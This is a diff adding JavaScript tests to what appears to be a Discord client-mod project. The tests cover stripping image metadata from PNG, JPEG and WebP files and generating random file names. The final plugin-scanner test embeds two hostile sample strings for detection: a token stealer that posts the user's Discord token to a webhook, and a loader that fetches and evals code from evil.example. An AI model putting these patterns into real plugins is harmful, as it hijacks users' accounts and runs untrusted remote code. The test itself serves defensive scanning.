@@ -91,3 +91,70 @@ test("code patch: method-shorthand factories become valid expressions", () => {
     }
     assert.equal((0, eval)("0," + toFunctionExpression('247775(e,t,n){return e+t+n}'))(1, 2, 3), 6);
 });
+
+import { stripMetadata, sniff, randomFileName } from "../src/shared/metadata.ts";
+import { scanPlugin } from "../src/renderer/core/pluginScanner.ts";
+
+function crc32(buf) {
+    let c, crc = 0xffffffff;
+    for (const b of buf) {
+        c = (crc ^ b) & 0xff;
+        for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
+        crc = (crc >>> 8) ^ c;
+    }
+    return (crc ^ 0xffffffff) >>> 0;
+}
+function pngChunk(type, data) {
+    const len = Buffer.alloc(4); len.writeUInt32BE(data.length);
+    const td = Buffer.concat([Buffer.from(type, "ascii"), data]);
+    const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(td));
+    return Buffer.concat([len, td, crc]);
+}
+
+test("metadata: PNG text/eXIf chunks removed, image chunks kept", () => {
+    const png = Buffer.concat([
+        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+        pngChunk("IHDR", Buffer.alloc(13)),
+        pngChunk("tEXt", Buffer.from("GPS\0 45.1,9.2")),
+        pngChunk("eXIf", Buffer.from("MM\0*fake")),
+        pngChunk("IDAT", Buffer.from([1, 2, 3])),
+        pngChunk("IEND", Buffer.alloc(0))
+    ]);
+    const out = Buffer.from(stripMetadata(new Uint8Array(png)));
+    assert.equal(sniff(out), "png");
+    assert.ok(!out.includes(Buffer.from("tEXt")) && !out.includes(Buffer.from("eXIf")));
+    assert.ok(out.includes(Buffer.from("IHDR")) && out.includes(Buffer.from("IDAT")) && out.includes(Buffer.from("IEND")));
+});
+
+test("metadata: JPEG APP1/COM removed, scan data untouched", () => {
+    const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x04, 0x4a, 0x46, 0xff, 0xe1, 0x00, 0x06, 0x45, 0x78, 0x69, 0x66, 0xff, 0xfe, 0x00, 0x04, 0x68, 0x69, 0xff, 0xda, 0x00, 0x02, 0xaa, 0xbb, 0xff, 0xd9]);
+    const out = Buffer.from(stripMetadata(new Uint8Array(jpeg)));
+    assert.deepEqual([...out], [0xff, 0xd8, 0xff, 0xe0, 0x00, 0x04, 0x4a, 0x46, 0xff, 0xda, 0x00, 0x02, 0xaa, 0xbb, 0xff, 0xd9]);
+});
+
+test("metadata: WebP EXIF/XMP chunks removed + RIFF size fixed", () => {
+    const chunk = (type, data) => { const h = Buffer.alloc(8); h.write(type, 0, "ascii"); h.writeUInt32LE(data.length, 4); return Buffer.concat([h, data, data.length & 1 ? Buffer.alloc(1) : Buffer.alloc(0)]); };
+    const vp8x = Buffer.alloc(10); vp8x[0] = 0x08 | 0x04;
+    const body = Buffer.concat([Buffer.from("WEBP"), chunk("VP8X", vp8x), chunk("VP8 ", Buffer.from([1, 2, 3, 4])), chunk("EXIF", Buffer.from("gps!")), chunk("XMP ", Buffer.from("<x/>"))]);
+    const riff = Buffer.concat([Buffer.from("RIFF"), Buffer.from([0, 0, 0, 0]), body]);
+    riff.writeUInt32LE(body.length, 4);
+    const out = Buffer.from(stripMetadata(new Uint8Array(riff)));
+    assert.equal(sniff(out), "webp");
+    assert.ok(!out.includes(Buffer.from("EXIF")) && !out.includes(Buffer.from("XMP ")));
+    assert.equal(out.readUInt32LE(4), out.length - 8);
+    assert.equal(out[20] & 0x0c, 0, "VP8X EXIF/XMP flags cleared");
+});
+
+test("metadata: random file names keep extension and SPOILER_ prefix", () => {
+    assert.match(randomFileName("my holiday.JPG"), /^[0-9a-f]{12}\.jpg$/);
+    assert.match(randomFileName("SPOILER_secret.png"), /^SPOILER_[0-9a-f]{12}\.png$/);
+});
+
+test("plugin scanner: flags token stealers, passes normal plugins", () => {
+    const stealer = `module.exports = class { start() { const t = BdApi.Webpack.getModule(m => m.getToken).getToken(); fetch("https://discord.com/api/webhooks/123/abc", { method: "POST", body: t }); } };`;
+    assert.equal(scanPlugin(stealer).risk, "high");
+    const remote = `fetch("https://evil.example/p.js").then(r => r.text()).then(code => eval(code));`;
+    assert.equal(scanPlugin(remote).risk, "high");
+    const normal = `module.exports = class { start() { BdApi.DOM.addStyle("x", ".a{}"); } stop() { BdApi.DOM.removeStyle("x"); } };`;
+    assert.equal(scanPlugin(normal).risk, "low");
+});
